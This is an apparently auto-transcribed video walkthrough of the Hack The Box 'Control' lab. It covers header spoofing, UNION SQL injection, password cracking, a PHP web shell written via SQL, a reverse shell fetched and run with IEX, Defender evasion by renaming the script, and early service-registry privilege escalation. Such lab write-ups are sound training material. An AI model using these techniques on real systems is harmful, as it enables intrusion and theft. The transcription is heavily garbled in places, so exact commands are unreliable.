 what's going on YouTube is it upside can be doing control from hack the box and if you learn anything from this box of video it definitely should be that automated tools are nice but you shouldn't have mind tries everything they say if you do there's two points in this box but you'll have a lot of trouble with the first one being getting a shell on the box because sequel maps gonna tell you you don't have the file privilege and it's also going to have a little bit of trouble uploading and executing a script to get code execution if you do it manually it works just fine not exactly sure why sequel map is failing but we'll go into how to do it manually the second part of the box will be doing the previs if you run tools like winpe seatbelt powerup sharp up it's not going to tell you can modify services but if you dig through the registry manually you'll see you can change keys and you can also see that you can edit the image path of a service and start some services so we'll be doing that manually to edit a service and start it to get code execution as local system with all that being said this will make much more sense hopefully once we do it so let's jump in as always we're gonna start off with it and map so - SC for default scripts as V enumerate versions Oh a output all formats when the end map directory and call it control and then the IP address which is 10 10 10 167 this can take a while to run so I've already ran it looking at the results we just have three ports open the first one being HTTP on port 80 and it's bandit tells us it's eye is running version 10 point oh so this is probably Windows 2016 or 2019 oddly enough when Microsoft updated to 2019 and or released service packs or anniversary editions whatever they decided to call it now they stopped incrementing this number so we don't know exactly what OS this is I'm going to create a note so we can check it if we ever get a shell so going over to Cherrytree I'm creating a node and Xiao Lu that's control LED and control shift and and I'll name this tab in case of emergency and is just gonna where I put some notes so is this 2016 if so potential probe ask of the juicy potato if you don't know what juicy potato is you can always just go to it rocks and then search for word if you just type juicy there's going to be quite a bit so now that we got that let's just move on to the next thing we have MS RFP see the Microsoft remote procedural call port on 135 not too much we can do there and then we got MySQL on port 3306 a little bit odd because normally when I see Windows servers I think of Microsoft sequel server not MySQL so this may be running like PHP or something it's definitely not running ASP because if someone's using like the Microsoft stack chances are they use all Microsoft services so we can test out logging into my sequel which is like MySQL - h4 host 10-10-10 167 and we don't get anything I'm going to just wait 30 seconds and do it again because I am reverting the box right now so maybe it's just not up yet if I do ping there we go there we go so I think the box was just coming up we get my host is not allowed to connect to this Maria DB server once upon a time mysql forked when they got bought out by I think Oracle maybe and then when that happened they just forked to a new name so Maria DB is the same thing as MySQL if we do - you for username we can try changing and we just can't log in so I'm going to create note what is what user does ask my SQL run under so there may be a way to prove ask if we can get MySQL to do some code execution so that's why I put that there I guess now is this good time to go check out the web page so going over to 10-10-10 167 we get fidelity is the title and some pages the very first thing I do when I go to a web page is press ctrl you to look at the source and see if we can identify if it's WordPress or anything and just scrolling down I don't really see too much but this comment did stick out to do import products link to new payments it assists enable SSL so I'm just going to copy this and we will put this in in case of emergency and I'm gonna put this under B top because this type of stuff is once we get a shell so once we get shell and then up here it can be other things so just keep that there in my notes and we'll keep going on and I should always do some type of recon in the background because you can't really make up the lost time so I'm just gonna run go Buster and mood - you - x4 are you an extension and we're going to test if this is PHP real quick so we can do like slash index dot HTML we get for for file not found we can try index dot PHP and the page comes back so we know it is a PHP server and for the word list user share word list dirt Buster then directory list - 3 medium dot txt and we'll do dash out and call this control - root dot alt and it's going on now we got an image directory and we got an uploads directory admin dot PHP a bunch of other things but before we go look at that let's just click around going to this about page it looks like a bunch of like lorem ipsum type stuff which is just random text so nothing too interesting here there was a good comment before so I'm just pressing ctrl you to look at the page we don't have any more HTML comments this sign up now link looking at the bottom left is going to about dot PHP is - nothing there oddly enough we're logged in this logout button is there if we go to home it says login and I'm bout says logout if we click logout nothing happens so checking out the admin and we get access to night head or missing please ensure you go through the proxy to access this page so don't know exactly what that is going back over here we have uploads database dot PHP let's check out uploads and one thing to point out is windows isn't case sensitive generally so you're gonna get a lot of the same things like images and images and all caps if this was Linux then one would be a 404 because it's case sensitive but windows it's not so just something to keep in mind this slash uploads directory if we go to take a look at it we get access to 9 403 forbidden so I'm going to start a second go Buster and this time we're going to do the same exact thing and see if there's any files in here so we'll do slash uploads and X for PHP and we'll do the same word list copy paste and this out file will be control - uploads alt so now we're searching the uploads directory for files we can resume this pane so we see results and we can play with I guess this header cuz we haven't really had anything else so exid ID header missing please ensure you go through the proxy to access this page I'm gonna Google HTTP headers proxy to see exactly what um headers a proxy would add and let's see accept-encoding oh man there's a lot of headers here let's see let's um change a Google query to be like proxy add headers and see if we have a list here for did custom header from nginx reverse proxy we can try nginx reverse proxies to see if there's anything here it doesn't look like it let's see this cheat and do x4 did 4 because I know that is one of the headers using forwarded headers from nginx and here are some headers that we may want to add check for like exported for x-ray or IP exported host this is by far the most common one but we'll go and check all of them looking at this we do have shell PHP from go busters so let's just add this to the notes there was Reb PHP as well but I'm not too interested in that because normally IPs are hard coded so we're just adding that there and we will get a note create a file called headers and wouldn't name this x-forwarded-for was it X real IP and X forded host maybe yeah and we wanted to find other ones we could probably just Google each of these headers and maybe we'll come to a page that has even more of these weird headers let's see I think an SMTP like X original IP is 1 so we can try that just in case it's for this as well so we got a few headers there let's use W fuzz - H for help and let's see where can we add header so right here header use header cookie : so let's do W fuzz - you for your L HTTP 10-10-10 167 slash admin dot PHP - capital H for header and we'll specify buzz : 127 0 0 1 and then - W for word list root HDB boxes control headers and everything returns the same we have fifteen words eight and eighty-nine characters I'm going to check I send this to a proxy just to make sure we did this correctly so let's see proxy - P so IP port type so - p1 2700 one port is 8080 and type is HTTP so let's go VIP suite go to the proxy tab intercept is on so we can just send this and a bad proxy tight maybe it's case sensitive all caps there we go and let's see X 44 127 0 0 1 so this is looking like it is done correctly so problems not there we probably have to do and IP address and looking at this we do have an IP here but let's just create a Python script real quick to put everything in this like slash 24 Network we could do a for loop and just loop through 0 to 255 to do this but let's complicate it a little bit and do a little bit of subnetting so going back here we will create the script gen-i peopIe and import the net address library but from that specifically we want the IP network command so now we can just do for IP and IP network and the IP was what 192 168 something 168 4.28 so would do 192 168 for 0/24 and then we'll just print the IP address so we can just do print IP ok let's see if we have that module on our system if not we can use pip to install it we do and there we go so we'll just do this to IP okay so we can go back to this w fuzz thing and instead of this one 27001 we can do fu Z to Z and specify a second word list so root htb boxes control and this one will be IP and I guess we can send it through the proxy again just so we can test it out and the very first one we have exported for 192 168 4.0 so I'm going to ctrl C out of the script drop the request and we will take the proxy off because we're going to be sending a ton of requests through this but it may go slow if we leave it cell do this and we probably want to hide that 89 so we'll do - - age capital C 89 we could have done H capital W to hide that I don't know if it's capital actually yeah probably just - - h c HH yeah HH i always thinking like every capital character is what you'd hide but apparently not so we have X 44 192 168 4.28 returns a lot more words and characters so let's go and add that to a header so going here we can go admin dot PHP we'll send this to burp suite so if we just for this request we get access to an ID so let's Ford the request and do X for I did four one nine two one six eight dot 4.28 I believe that was and then send this request off and then we can tow an intercept off and we get the page the issue is going to be if we go back well you don't have that header so let's go to Britt on the proxy tab go to options and we're going to match and replace make sure this is on request header and if you read this if it's blank it'll add a new header so we'll just put something in replace x4 did for 192 168 . 4.28 and we'll put the comment here for control on HDB to mimic proxy click ok so now we will be adding this request have it to all the requests we refresh the page boom you could go back to burp look at HTTP history let's see we go here this is the first time we last time we request it admin dot PHP you see original and all a modified requests where we added it so we got that and the headers there and if you're kind of confused what's happening here proxies like adding what IP address they came from it's just something proxies do I'm trying to think of the legitimate use case off top my head but I don't really I guess for access log so if we go here we have our client to proxy to internal website so in this internal websites log the access log is always going to have the proxy address because the proxy kind of terminates the HTTP the client makes an HTTP request here and then the proxy makes it to the internal website so the client is always going to show this proxy IP and that's not good for each to be access log because what if something bad happened what if you saw like an SQL injection and all you saw was the proxy would be hard to translate it back to the client so what happens is when the client makes that request the proxy adds a header and then the internal website now the access log is going to show the client address of the header so now when you look at that access log you're like oh well it came from the proxy but the proxy is telling me this was the host so that's kind of why you have these export it for headers just so the website knows the original clients IP people has sometimes made that for like ACLs and stuff and that's what we're abusing here but the use case I've generally seen this for is logging issues so hopefully that makes sense but we'll just move on and we have this page so find products create product categories create category so let's just go and we'll do fine products P I guess so we'll do fine products P click search and we get one item back so let's go and test out SQL injection here because that's generally the first thing we always go for so intercept on and we'll do whoa P and then send this over to repeater click send and we can scroll down we can see this which is what the page had said so let's add a single quote and if we looked before this is 2273 bites with a single quote it is 2418 bites so we know the page changed and looking through this we can see an actual SQL error so if we add a comment after this we can see the error goes away because the server probably appended a single quote so this airs the server doing the comment makes with the server of pens non-existent so we can play with Union injection so before we do Union let's do or by one and we're just going to count the number of parameters because unions need to have the same order left and right and I'm gonna guess 1 2 3 4 5 it's going to be 5 but we have two hundred two thousand two hundred and seventy-three so we're trying to get see one that changes so doing five we still have that six still have that seven it changed now it's 286 and column not found unknown column seven so we know there's seven things so we can do Union select one good we know they're 6 3 4 5 6 and it's good so if we put something here if we do like please subscribe and column number one it now has please subscribe it on the page so we over wrote that thing if we didn't have six things and had a mismatch after this Union we see an error message as well so order by is just a shorthand way of doing a bunch of unions and sometimes Union is like a dirty word and a lot of filters would just say hey I don't want to accept Union from clients like this and block your request order by is much more benign so it has a higher chance of working so that's why I do order by there but with this Union injection we do have an injected there so we can do Union select and we could do let's try user and see if this works let's get rid of these double quotes and we see a we are running as manager at localhost so we can also do queries so the very first thing we always want to do is kind of enumerate the information schema table so let's just go sir we can turn burp suite off and Google and formation schema MySQL and we got the tables we're going to want to do what is it schemata there we go and before we go too far into this let's stop at SQL map because again always should have some type of recon going in the background so I'm going to copy to a file and we're going to make this I guess inject SQL save it V inject SQL I'm going to remove our injection because SQL map doesn't like you giving it a injected thing already save this and we'll do SQL map - our inject ul - - technique equals at you for Union I think it's B ei UST boolean air I don't know what a is Union stacked and like timing so there may be a you but this was a bunch of techniques if you look at the main page you can read about them but we'll do that and then - - batch so that's just going to make it so it doesn't ask us anything so going back to this we can manually extract things out of this so the schemata table we want to do the schema name so we can change this to be select schema name from information schema dot schemata and we'll probably have an error message sub query returned more than one row so if you want to get rid of this error we can just do a group concat so group underscore Co n CA t and let's see syntax area see where did I air let's put this in quotes as well ho not quotes but parentheses okay let's see oh I put the group can cat and the wrong spot so let's leave that select there and the group can cat goes in here it goes on the field you want to select so group can cat schema name and we have a bunch so information schema MySQL and warehouse if you don't like using commas as a separator I think you can change that so group can cat MySQL you look at the function order by yeah separator so distinct order by I can try this cat separator let's try the semicolon first does this work it does so we could change that to be backslash n for new line and get it that way so schema names are information schema MySQL and warehouse so we can go to the next one look at tables this tab information schema tables and we can do table schema that's going to be the table database so table name so we can do group can can't table name from information schema dot tables where was it table underscore schema is that right yeah and that will be I always forget how to do equals I think it's just equals warehouse let's try this there we go yeah that's right so I'm going to get a new tab whoops SQL and we'll just leave these we'll forget the very first one but all we have all good SQL commands you run because when it comes to writing the report you may want to include screenshots that you forgot to take so that misfeeds things though if you wanted to get the column names we can also do that so let's go to columns where is columns right here and table catalog table schema so we want to do table schema again and we're going to get table name and column name so we can do table name comma column name and then we're going to change that separator to be colon and I'm going to do backslash n here we'll try this except this will be tables calm not found column name oh we want columns there we go let's see that did not print how I thought it would table name column name I guess we can get rid of this backslash n what does this look like product ID product name [Music] let's see SQL map is done but I don't want to do this manually let's see product ID product name guessing every two would be what we want let's see put a period there what does this look like product ID product aim okay separator backslash n colon that's what I want that's much more readable so we're gonna go of this command real quick so what this did was we are selecting I don't know why it randomly that always stops but that comes up oh well going back we're doing a group can cat we're putting table name and then we're putting a colon the column name so there's going to be one field and every time this happens after it it puts a backslash n so that makes it really readable so we can go back and we have all the stuff we want and it doesn't look too interesting so this will be columns because I don't see like users and passwords so if we wanted to extract data we could do I guess we can extract pack name sure so select group can cat we can change this to pack name from information schema this will be from warehouse dot product packed ACK yep and we don't have this where clause com not found pack name is it underscore I will do PAC name comma product I don't know why that just didn't work warehouse and dot product pack maybe we're just completing the sequel query and it prints this that's funny ABC so just before ABC that maybe we can do tax tax in price so we'll do price tax and instead of product packed we will do product there we go so now we extracted all the tax in price so that is how you extract data from this if we go through sequel map let's see actually before we do that let's go and pull this shell dot PHP so if we go ten ten ten 167 uploads shell dot PHP it just says no but since we're in MySQL we should be able to get the data out of this so we can do group can cat as it load underscore file and then I think the default location is I net pub dub-dub-dub root and then we can check uploads shell dot PHP we don't need the separator if I don't need group can get because is gonna return one thing see to this work will do to base64 okay we will do I didn't think we needed that let me get rid of select oh why don't we have this from statement clean that up syntax error P Union select okay where we have wrong one quote two quotes three quotes family of parentheses not quotes there we go so now we got base64 see another thing we could do is put concat we don't to do grouping catechism only dealing with one Road one row so we can do please subscribe comma and then after this let's see we want to do this and support me on patreon then add another parentheses and everything between please subscribe and support me on patreon is going to be the base 64 but to make this a bit more readable let's just add line breaks so - backslash ends and - backslash ends so this is basics t4 we just extracted the code of this script and if we do echo - and paste this base64 - D it just says no so looks like this is going to be a troll we could try a rev PHP and it's the same thing if we wanted to test we can make sure it works by grabbing admin dot PHP and we get a bunch of base64 so we can grab this go back here let's make the source V admin dot PHP be 64 paste base64 - D and Men and we can pipe that over to admin dot PHP and edit it and we can see the source so let's see this is where they are checking if the IP is in the HTTP x-forwarded-for header and you can see this tag and PHP HTTP underscore or dhin I think is going to I know exactly now we could Google and search that but I'll leave it to you to see exactly what this means so just search like PHP HTTP header HTTP underscore gen you'd find out so go through this source to see if there's anything interesting we got a database dot PHP file so let's go grab that so database dot PHP okay go back here be database dot php' b64 paste did I have an eye first yep and then we can do page 64 - d2 the same thing if you're wondering how I'm typing that so fast I'm doing alt period which just cycles through previous arguments you've done so we can do V database PHP and we see a potential user name and password manager with the password let me in so we can go back to Cherry Tree and then do ctrl shift and creds SQL manager let's copy this paste there we go and that's about it for the source if we go into home dot sequel map we can go take a look at what this extracted and this is actually going to lie to us I don't know exactly why Oh hold on let's exit this SQL map what we got to do - - dump - all and there's a dump things for everything so it's also going to try to crack things and if we're looking at this let's see SQL map is telling us manager does not have file access and we go look at this I think this part is true let's see if you're wondering how I know this it's what I did the Box a long time ago and looking at my notes I don't trust any automated tools on this box and then I remembered exactly what was going on so we want to look at user privileges table and we want to extract these fields so real quick we can grab this paste it in our sequel notes and then we'll go back to this one so we want to do few things so going back to the page grant T we want and then after grantee we want table catalog oh man what if there's a different paste option because I don't want to paste as like whatever special characters it's putting in a ctrl shift V plain text okay we'll use that so this one was grantee table catalog privilege type and is grant will okay and from information schema user privileges good got told you it again I think I just redo control why British type and will do the last one I'm not sure what I just did sometimes you hit keys and weird things happen and then you're just like what did I just do and you give up trying to figure out what you did and just redo it that's what happened there so highlight this delete that where clause ctrl shift B user privileges this should be fine copy this let's go to burp paste go and here we go so we got a list of all the privileges and we only want to look at Hector real quick so file is equal to now but the load file command worked which is weird where is this there we go and we are running as a manager because if you remember a while back when we did user it showed manager at localhost and this is saying file Mel if we look at my SQL file privilege let's see reference manual privileges cup file file access on server host so that load file thing shouldn't have worked if this is the correct one but there's also a MySQL users so let's do MySQL dot users and let's go google mysql users database install users come on users schema they grant well let my uh just go through the output of sequel map to get the schema we're looking for if you wanted to you could redo the whole process we did to extract like that tax information doing on the users table and extract it but thankfully we can cheat we go to output go in here go to dumb go to my sequel and let's look at user dot CSV that is ugly so it's looking like it uses comma as delimiter so I'm going to cat user dot CSV pipe to said change comment out for a tab and that's looking better we do less - capital s to disable word wrapping and boom we can look at it very easily so let's see root root root manager so we want to do manager one two three four five six seven eight so if we look at manager eight so we can grep the manager and then I'll print eight we get no if we didn't do that grep we could do print we'll do I think one two eight and localhost manager no and that's for the file privilege but if we go in burp and we change this so we'll change this Union select to be user and we want to look at that file underscore Prive yep probably a lowercase P see this we're going to leave that separator flag okay from MySQL users hopefully I did that right base table MySQL users let's try from MySQL C warehouse Oh user MySQL dot we have hectares yeah manager as yes when the sequel map told us no so I don't know exactly what's going on there maybe it's taking the privilege out of the information schema and trying to apply it here and I think the information schema that's like is grant Abul so that may say hey this users allowed to do that she allowed to grant him the privilege but if it's no then you can't even grant it to him so what I'm thinking happened is sequel Maps all that information schema assumed it was no here and then either flush privileges hasn't been ran on the database or Hector was I've got actor manager was granted privilege before that information schema change happened I don't know exactly why SQL map saying no there but we can see it's yes and when we did the source code stealing it also worked so this is a long way of saying there's another thing in SQL called out file where you can write files to disk so seeing that as yes means oh before we do that let's extract the password hash so I digress one more time we're gonna get there it's going to be worth it trust me we could just grab all the hashes out of this but I don't think people like doing it that way for some reason so we'll do it manually so less - capital s let's see password let's see host user plug-in is roll password so capital P so go back here step foul probe will do password and we can extract all the hashes so we can grab this and sequel map does a very bad job at cracking so let's go over to our machine called the Kraken which is just a box at home I just don't like doing cracking in a VM if you're doing this you probably should run it on your host not within a VM because hash code and a VM is no bueno but yeah let's just go into hash cat V hashes slash will call this control - MySQL paste and we'll do dot slash hash cat - - example hashes search from MySQL I'm guessing it's 300 because this 3 - 3 thing is a stupid short hash this is looking better it doesn't have that star so we may have to delete the star out of it dot slash hash cat - - user because we have the user : - password hash - mood 300 hashes control - MySQL and opt word list rocky text we'll see if this starts I don't think it will I think we have to delete the stars out of it based upon what example hashes said so token length exception so we go hashes control and we can well there's a duplicate there we go delete the star and is it going to go there we go it except at that time and we got another crack Lee the XOR Hector or elite hacker X Hector lead hacker that's what it is so I'm just gonna do - - show and we can do Hector and this so going back to here creds SQL Hector that there we go you can get out of the Kraken and let's see if we can drop a web shell here so let's do Union select please subscribe and then we'll put into out file C : was it high net pub dub-dub-dub root and we'll call this please subscribe dot txt send this general air is what we got but if we send it again file already exists so for some reason this evil command error is out but the file is there so if you try running again you can confirm that let's okay we're not using but sweet base this and we get it so there's another command also called dump file in - whoops oh my god hang the wrong keys I think dump file maybe it's just dump but will do please subscribe to and it just changes the formatting up a little bit whoops so looking at the source here we got this and a new line this is just like that dumb file is generally going to have less bad characters than out file that's why I use it and it's also I think not the default and a lot of tools and not using the default things means you may bypass some type of signature for detection which is also good so let's change this to be PHP code and we can do PHP system requests please subscribe ok see I think that I typed it right will do patreon rocks dot PHP so if we now go to patreon PHP and we put the question mark I do caps I did camelcase it please subscribe is equal to Who am I we have code execution on the box finally so let's get out of view source so we can send it to burp suite proxy that's not the thing there we go and I'm just doing in a burp suite because it's easier and I love changing the request method doing post so I have to worry about doing URL encoding it's just less bad characters in a post request so the very first thing we want to do is get a shell in the box of course so IX new object net dot web client download string HTTP 10 10 14 - I believe I am and we'll call this rev ps1 and we need to say PowerShell and we'll put that in quotes so let's go clean up our things real quick make the dub-dub-dub go in here copy user share nishang shells invoke was it s in folk - powershell tcp ps1 - shell ps1 edit this and let's see we want to take this reverse line paste it down here and we'll put our IP let's 3 times 4 is 12 3 dots 15 10 10 10 14 - 4s 9001 so how I deleted everything I counted the number of characters and hit 15 you can see that right there and then why did s that means delete and right and yeah but now it would not be 15 because these only two so that would be 6 8 11 so every did 11 X it would run delete 11 times so that's what I was doing there we changed it to port 9000 1 so n CL vnp 9001 let's do RL wrap that will give us like up key left right and stuff which is very nice python 3 - m HT p dot server - P 80 I can type Python correctly that would be great we don't do - P just 80 there we go so now we can run this revved-up ps1 missing recorded shell let's laptop ps1 we got it but we don't have a shell so the very first thing I'm going to do is we can try changing the port so Rev dot B dub dub dub Rev ps1 let's change this to 4 4 3 n COV mp443 we get it and still don't have a shell so at this point I'm King is defender and you can run like PowerShell invoke - obfuscation against it if you know what that is you can probably search it sector rocks for up you skate or google around for it and it will automatically do a bunch of obfuscation - PowerShell to kind of try to bypass defender but we're just going to do it manually so I'm going to delete all the comments because I'm assuming defender has some type of bad word in this script that's detecting it's probably invoked - PowerShell PCP because that does not sound like a good function but we're just going to delete the comments out of the script see if that works and then rename the function hit no shell so let's try change the name of this to be totally not malicious and then here we'll just do it again totally not malicious so now that's a new function name let's just clean that up send this hit and we get a shell so defender just does not like the name invoke - powershell tcp whatever it is probably cpu reverse so that's just a MSI the anti-malware something but easy to bypass because it's just looking at lines invoke application just renames a bunch of crap and does a bunch of things to disable that type of detection but it's nice to see it actually working like that so now we're on the box we can do who am i / all and there's going to show us all the tokens we have and we have the SE impersonate privilege so juicy potato may work we do system version this should tell us if it is Windows 2016 or 2019 so running this command it's not that crap where does that come in is it system info oh well I forgot the command name what's just Google Windows command show patches command prompt system info what access denied whoa so we don't have a mission to actually run that interesting let's try windows system32 get content GC readme dot RTF license i think c does this say 2019 2016 I think my shell just there we go show do not die let's see panther windows get version see is there a command system Abell let's see probably have to search like Windows PowerShell this is what I say what PowerShell version would OS version through PowerShell via WMI there we go try this so this is going into the registry H key local machine software windows NT current version get value release ID this should work 1809 see windows release ID 1809 2000 1903 28 so I don't think juicy potatoes going to work against this so go back to in case of emergency 1809 at least not without some heavy modifications so let's go take a look at other things let's run wind peas so let's go to a new pane up privilege escalation awesome script sweet wimpies wimpies wimpies exe when peas then release when psi DX eat finally and go where is it tbh foxes control dub-dub-dub okay and actually before we run this command there's one thing I want to check so we do Who am I we're anti-authority I user we do net user we do have Hector we could do net user Hector as well and see information about him he is a member of remote management users and we potentially have his password so let's try seeing if we can run to command us him so let's do pass is equal to convert to secure string and then his password so let's do creds copy okay and then what is the next thing it's as plain and - force pass now that's a secure string cred is equal to new object system management automation PS credential and that's gonna be Hector Pass okay cred there we go next thing we need the host name of the computer fidelity okay host name is not control weird especially when we if my buffer is big enough it's got PowerShell running as control control so it looks like this machine was renamed because here it thinks the box name is control and here thinks it's fidelity so pretty unique they're not sure exactly what that implicates or anything but just something to keep in mind so invoke command - computer fidelity and then - credential credit - script block ix new object net web client download string HTTP 10 1014 to rev dot ps1 I think we called it or do n CL VMP Oh is this running as 4 4 3 it is NC l v NP 4 4 3 run this command we got and got a shell Who am I we are now Hector your own system in film access denied still so what I'm going to do is copy this because if we have a lose/lose this show typing this all out is a pain so we'll copy each command change user and put it here copy and copy oh it's gone I hate when I do ctrl Z and it does way more than I expected I guess it could be done control wide to redo but I panicked a lot of things got deleted as a CO god what am I gonna do and then yeah that's how that happened but let's move on so we are now Hector so let's run the wind peas so we can just do W get HTTP 10 10 14 to win pzx see out file win peas dot exe and we can see we did download it so we can just draw in dot backslash win peas dot exe and this should take a minute to run and we'll see exactly what this says so I'm gonna pause the video let it run and then we'll resume when it's done when peas has now finished so let's go take a look at it I'm just going to go to the very top let's do search dot backslash wind peace there we go and we can look through everything it says so let's see PowerShell logging settings that's interesting but nothing their laps not installed so the local administrator password is not change frequently and it's probably not going to be super secure and random lapse is like local admin policy something I think essentially it lets the local admin account of a Windows box be controlled by Active Directory where Active Directory resets its password every X days so it kind of prevents against past the hash attacks because every workstation has a randomize password let's see LSA protection this will set else a CXC to be a privileged process which means you need a kernel driver or something to read it privileged processes you just even if you're administrator you can't go and dump its memory so that's what that is cadential guard I believe that's kind of like privileged process but it's running in its own like VM outside of the OS I think if you go to these links you can read more about them let's see computer name control but we're that host name returns fidelity unique process username I'm seeing if this ever says like Windows version I don't see it see system environment variables nothing too interesting hg current users internet security drive information looks like c colon users can create directories so we could do like abuse the unquoted service path because we can create directories at the root of c and that one is like if you do C colon backslash program space files windows does recognize that but it's going to try to go into C colon backslash program first and then when it can't access C colon backslash Pro it's gonna access probably program Exe you may want to do more reading up on that but if you do C colon backslash Program Files stuff it would probably be like software slash test dot exe if this is in the binary path of a service and it's not quoted then windows will try to execute like program Exe first and then do some other things and then go into program file software so because of that behavior how it treats a space where it's not quoted if you created that file you could get code execution when that service starts so that's that hopefully that makes sense well let's see UAC status nothing interesting token privileges RDP sessions order login credentials C control nothing about is services and this is going to be where again the theme of the boxes don't trust your tools because this is actually going to fail so this is trying to overwrite service binaries for uncor to path and stuff and we can't really do anything here and then the next check is going to be registry I believe and this the one where the tool is not working right so modify service and if you have can modify any service in the registry and it says we can't so I'm going to copy this just for notes actually is it control shift print screen yes it is because I like the coloring so if I copy that I want to get the coloring in this note paste so we'll come back to that one this took me a long time to find when doing this box so auto run applications nothing too interesting here we probably can't write VMware tools or in system 32 so that's why I'm ignoring them scheduled tasks let's see network information we never really looked at what MySQL was running under see windows won't RDP deep happy master keys cred files see read this guide to see exactly what app cmd.exe is I'm not sure I'll top my head current ie tab interesting files and registries so right here is interesting we have when I try to go into Panther before I was in system 32 I think it's not in system 32 but this is where the like initial like user password used to be set when you install Windows through like an automated tool they have since put sensitive data deleted in this file so you don't get the password anymore on super old versions of Windows you would but we have a username eros and I don't think that username existed maybe that got renamed to Hector so this is just going on like maybe when this box was called fidelity the username was eros cache credentials register your keys password files and that's it there's one thing I wish wind peas would look at and maybe we'll create that in another video sometime down the road but there is a like it's kind of like bash history but for PowerShell on Windows if you go to app data roaming Microsoft Windows PowerShell and then it's the PS read line directory there's this console history host let's just copy and paste this and this will be like pow shell history and we can see doing get a child item on this so if we run this command actually I want to copy this and then we can copy this next command to see exactly what they are doing so that's getting a list of all the services on the box and looking at this there's going to show the permissions this SD DL it's a pain in the butt to read but if you do let's do what is it let's go back to that get a CL command so shoot or is it I guess we can just type it so AC L is equal to get a CL let's do H key local machine system current control set and then is it services a CL okay so if we do convert from SD DL string and this is I think called a dackel I forget what s DD L stands for if we just look at this PowerShell thing and Microsoft it'll probably tell us closed on use tabs one of my bad habits I leave a lot of things open let's see security descriptor definition language it's kind of like Windows way of doing permissions I think later in the video we'll go over it exactly what these mean but this is just a quick way to get it human readable so this will be a CL dot what is it STD L and - type registry writes if you look at this type the default is file system rights but we're looking at the registry so that's why I changed it to registry rights and then for each object in where is it [Music] discretionary ACL I think there we go [Music] natsu pretty easy to read in this shell so we will copy this L go over here useful PS so let's see now is the command we're and we can get rid of the and we'll put a line break between each user so what we're doing here is listing each user and what they're allowed to do so we are a control Hector and we have full control over the registry we can change permission a full control right there we can write whatever do whatever we want to the registry and this registry is where service configurations is so let's go and if we just go CD hklm PowerShell is really cool oh shoot I don't have read line wrap here do I let's control see how this show quick l rap go back to a previous shell and we will do creds no change user command boom so now I got my up well that was a while ago this chisel video what box we were doing there but now I also have control l to clear the screen but if we go into H key local machine GCI we can get like hardware Sam software so we can just navigate the registry through PowerShell it's really cool so we want to go in system current control set services do GCI here it's going to take a second and dump all the services so if we go into a service let's do wud frd GCI here again dir let's go into Windows updates GCI we can also see things like the security and this is where the permission is actually set so if we do I think get item security this is the dackel or SD DL and binary form and to pain to manipulate so we're going to ignore it for now but just showing you how you navigate the registry in PowerShell so let's see what other things do we want to do let's get all the services that are running as system because we can modify them so we can probably start stop change the binary path etc so since we can modify the service in the registry what we want to do is find a service that is running as local system that is probably not running so probably use like startup type as manual and additionally we want to find it that we have the permission to start and stop the service so that's what this piece of the video is going to be a balance so we'll do services is equal to get hired on property - path and we can just do start or let's do full paths so you understand exactly what's going on because we're in this directory so if we just did star it would go from that directory but system currentcontrolset services star okay so that's just this now we did Services select let's say like was PS child name making a list of all that if we did measure we could get account that's 613 services way too many so if we look at this the display name where is it it's going to be I think it's object something object name so let's get object name and look at this so services select object name and we're only interested in local system because we already have like a network service account that's what it's running as so if we do now services and we change this to be where and then object name is equal to local system we can say there's going to be temp I guess is equal to that okay Tam select PS child name measure so now we got 137 services we also want the stood up to be manual so if we Google let's go back here and registry service start value see if we this works okay here's what we want I think the driver can't be loaded that's not it colonel I know where it's getting this but to is automatic I think three is manual for is disabled so we want three I don't know what 0 1 or 0 is if you do a lot of googling you'd find it out but 3 is set to manual so we can do here and we want to change this to be - and this will be object not object name start is equal to 3 I think that's right damn we can just hit up a few times 89 so now if we look at this we're only doing things that are equal to 3 so all the manual ones so if we do temp select PS trial name you can see all the services on this box that a stirred up type is equal to manual the last thing we want is to be able to see what services we have the Stewart permission to and I don't know a good way to convert the was it get it I think good item security convert this property the binary form dackel into readable but we can use SC and SC is the windows binary it's within like sequel in windows system32 SC exe if we're in a PowerShell pump and just type it it's probably going to do something different I forget what this is alias - it's the same reason we're like we do get child items is it get child item we're on this command and that command is the same thing as GCI its power shuttle has something for SC so if we just type SC it's kind not going to do the executable SC so to get around that I do CMD / C and we can do SC SD show and this will be let's keep doing Windows updates wau QA sov so we got this tackle and we can also convert this so if we do the what is it convert from SD dl string - SD DL I mean capital S I don't have case sense casein casing probably doesn't matter and we can convert this Oh convert from Oh forgot the tea there we go and we could go again and select this and do for each object and this discretionary ACL to print a bit better and go back here we'll just delete that real quick so authentic aid uses is what we want so this SD DL let's see a u so the username is the last so au this is going to be probably built in administrators so that one's probably this one and this is system so that's users and a is allow so everything they're allowed to do and these are what the permissions are so cc's probably create directories or something but RP is what we want I think we go to Google and Google let's see SD DL start stop service and this blog post explains everything super well it's also explaining that register dackel in the registry and we could probably update this for any service and give yourself permission over a service since we have write access to the registry but RP is service dirt WP is service stop and our C is read control so let's go back to our shell and we're going to convert from ACL string and we're only going to do and then a you because that's what we care about and let's just look at what RP is that'll be right extended attributes so let's see WP would be stopped and I'm only doing this because there's no what is it type and convert to SD DL string if we look at this man page do I still have it yes I do go to the types there's nothing for registry as a serve or a service tackle so if there was you do type and then when you do RP it would show service start but that doesn't exist so we're just remembering RP means write extended attribute all right RP is service start which our tool is going to tell us is write extended tribute nothing really that important I'm just explaining it in case you go digging down rabbit holes and that's something that would have saved me time knowing but what I want to do is we have a list of services we call it a temp actually temp yeah so we want to do names is equal to temp PS child name so now we got a variable with just a bunch of services so what we're going to do is do a for each service and names and I'm typing in here because we have to do it in one line on this box and if we do it in one line is going to be confusing so SD DL is equal to CM d /c SC SD show service and then we'll do if SD DL is a match for our P and then a to z and then anything 1 2 3 au then we'll put service and close this and close this so essentially what we're doing here is going to be looping through every service in the box running this SCS D show command and if it matches the service start permission and then repeat any characters any number of times do three semicolons for authenticated users add that to the variable so again do we have it still in a PowerShell so this was the deckle and we can get rid of the last one just so it's one line so in this is going to match the RP here and then it's going to be fine with any other character an unlimited amount of times until it hits semicolon three times and that's looking for a you fall ten Takeda users so that's why this is going to match when it goes here it's gonna see RP it's gonna match hit three semicolons and all built-in administrators nope doesn't match that a you so that's what this command is doing so let's put this on one line and then hope it works okay and we'll call this one start okay we can call this can start paste run and of course did not work so let's see for each service n names CDL if STD ll match we probably have to put parentheses here let's see oh so if you look really close you got stupid unicode quotes because that's what this put they're angled we don't want angles there we go I've wasted so much time my life because of the angle a quote is facing it's ridiculous construct so here's all the services we can start so let's do notes [Music] okay so let's keep working with Windows Update service so first before you do anything I want to show you that um there's two 